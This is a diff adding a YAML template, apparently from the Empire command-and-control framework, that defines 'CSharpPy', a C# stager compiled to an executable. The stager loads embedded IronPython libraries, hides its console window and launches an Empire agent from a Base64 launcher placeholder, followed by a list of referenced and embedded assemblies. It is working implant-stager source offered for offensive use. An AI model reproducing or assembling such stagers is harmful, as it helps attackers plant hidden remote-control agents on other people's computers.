@@ -1,0 +1,153 @@
+- Name: CSharpPy
+  Aliases: []
+  Description: Generate a IronPython C# solution with embedded stager code that compiles to an exe
+  Author:
+      Name: Cx01N
+      Handle: Cx01N
+      Link: https://twitter.com/_Cx01N
+  Help:
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net40
+  Code: |
+    using System;
+    using System.IO.Compression;
+    using System.IO;
+    using System.Text;
+    using System.Collections;
+    using System.Reflection;
+    using System.Runtime.InteropServices;
+    using System.Threading;
+    using CSharpPy;
+
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool AllocConsole();
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
+        public static void Main()
+        {
+            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
+                        {
+                            String resourceName = new AssemblyName(args.Name).Name + ".dll";
+
+                            // Load embedded resources
+                            using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
+                            {
+                                Byte[] assemblyData = new Byte[stream.Length];
+                                stream.Read(assemblyData, 0, assemblyData.Length);
+                                return Assembly.Load(assemblyData);
+                            }
+                        };
+            string B64PyCode = "{{ REPLACE_LAUNCHER }}";
+            ShowConsoleWindow();
+            new Thread(() =>
+            {
+                Empire.Agent(B64PyCode);
+            }).Start();
+            HideConsoleWindow();
+        }
+        public static void ShowConsoleWindow()
+        {
+            var handle = GetConsoleWindow();
+
+            if (handle == IntPtr.Zero)
+            {
+                AllocConsole();
+            }
+            else
+            {
+                ShowWindow(handle, SW_HIDE);
+            }
+        }
+
+        public static void HideConsoleWindow()
+        {
+            var handle = GetConsoleWindow();
+            //var handle = Window.FindWindow(null, Console.Title);
+
+            ShowWindow(handle, SW_HIDE);
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries:
+  - Name: CSharpPy
+    Description: IronPython Empire Agent Library.
+    Location: CSharpPy\
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net40
+    ReferenceAssemblies:
+      - Name: System.dll
+        Location: net40\System.dll
+        DotNetVersion: Net40
+      - Name: mscorlib.dll
+        Location: net40\mscorlib.dll
+        DotNetVersion: Net40
+      - Name: System.Core.dll
+        Location: net40\System.Core.dll
+        DotNetVersion: Net40
+      - Name: IronPython.dll
+        Location: net40\IronPython.dll
+        DotNetVersion: Net40
+      - Name: IronPython.SQLite.dll
+        Location: net40\IronPython.SQLite.dll
+        DotNetVersion: Net40
+      - Name: IronPython.Wpf.dll
+        Location: net40\IronPython.Wpf.dll
+        DotNetVersion: Net40
+      - Name: IronPython.Modules.dll
+        Location: net40\IronPython.Modules.dll
+        DotNetVersion: Net40
+      - Name: Microsoft.Dynamic.dll
+        Location: net40\Microsoft.Dynamic.dll
+        DotNetVersion: Net40
+      - Name: Microsoft.Scripting.dll
+        Location: net40\Microsoft.Scripting.dll
+        DotNetVersion: Net40
+      - Name: Microsoft.Scripting.Metadata.dll
+        Location: net40\Microsoft.Scripting.Metadata.dll
+        DotNetVersion: Net40
+      - Name: System.Runtime.CompilerServices.Unsafe.dll
+        Location: net40\System.Runtime.CompilerServices.Unsafe.dll
+        DotNetVersion: Net40
+      - Name: Microsoft.CSharp.Reference.dll
+        Location: net40\Microsoft.CSharp.dll
+        DotNetVersion: Net40
+    EmbeddedResources:
+      - Name: System.Runtime.CompilerServices.Unsafe.dll
+        Location: System.Runtime.CompilerServices.Unsafe.dll
+      - Name: System.Memory.dll
+        Location: System.Memory.dll
+      - Name: System.Buffers.dll
+        Location: System.Buffers.dll
+      - Name: IronPython.dll
+        Location: IronPython.dll
+      - Name: IronPython.Modules.dll
+        Location: IronPython.Modules.dll
+      - Name: IronPython.SQLite.dll
+        Location: IronPython.SQLite.dll
+      - Name: IronPython.Wpf.dll
+        Location: IronPython.Wpf.dll
+      - Name: Microsoft.Scripting.dll
+        Location: Microsoft.Scripting.dll
+      - Name: Microsoft.Scripting.Metadata.dll
+        Location: Microsoft.Scripting.Metadata.dll
+      - Name: Microsoft.Dynamic.dll
+        Location: Microsoft.Dynamic.dll
+      - Name: Lib.zip
+        Location: Lib.zip
+  ReferenceAssemblies: []
+  EmbeddedResources: []
